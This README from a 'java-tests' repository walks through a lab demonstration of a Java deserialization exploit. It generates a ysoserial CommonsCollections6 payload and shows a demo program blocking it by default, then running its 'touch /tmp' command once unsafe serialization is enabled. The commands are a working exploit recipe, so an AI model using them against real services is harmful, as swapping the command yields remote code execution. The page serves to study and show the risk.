# java-tests

<!-- TOC -->

-   [java-tests](#java-tests)
    -   [Deserialization Exploit](#deserialization-exploit)
        -   [Create payload](#create-payload)
        -   [Get Commons Collections](#get-commons-collections)
        -   [Abuse deserialization](#abuse-deserialization)

<!-- /TOC -->

## Deserialization Exploit

Successful Deserialization exploit using the ysoserial CommonsCollection6 payload...

### Create payload

```bash
/app# payload="CommonsCollections6"
/app# filename="data/${payload}.bin"
/app# command="touch /tmp/$payload"
/app# java -jar ysoserial.jar $payload "$command"> "$filename"
```

### Get Commons Collections

-   Download Commons Collections 3.S from the Apache Commons Collections [Download Page]](https://commons.apache.org/proper/commons-collections/download_collections.cgi)
-   Copy main jar file commons-collections-3.2.2.jar to local dir

### Abuse deserialization

```bash
/ap# export CLASSPATH=.:commons-collections-3.2.2.jar

# WITHOUT enableUnsafeSerialization=true

/app# java DeserializeDemo data/CommonsCollections6.bin
Deserializing data/CommonsCollections6.bin
Exception in thread "main" java.lang.UnsupportedOperationException: Serialization support for org.apache.commons.collections.functors.InvokerTransformer is disabled for security reasons. To enable it set system property 'org.apache.commons.collections.enableUnsafeSerialization' to 'true', but you must ensure that your application does not de-serialize objects from untrusted sources.
        at org.apache.commons.collections.functors.FunctorUtils.checkUnsafeSerialization(FunctorUtils.java:183)
        at org.apache.commons.collections.functors.InvokerTransformer.readObject(InvokerTransformer.java:164)
[...]

# WITH enableUnsafeSerialization=true

root@dfe5efe5da84:/app# java -Dorg.apache.commons.collections.enableUnsafeSerialization=true DeserializeDemo data/CommonsCollections6.bin
Deserializing data/CommonsCollections6.bin
Exception in thread "main" java.lang.ClassCastException: java.util.HashSet cannot be cast to Employee
        at DeserializeDemo.main(DeserializeDemo.java:11)


/app# ls /tmp
CommonsCollections6
```
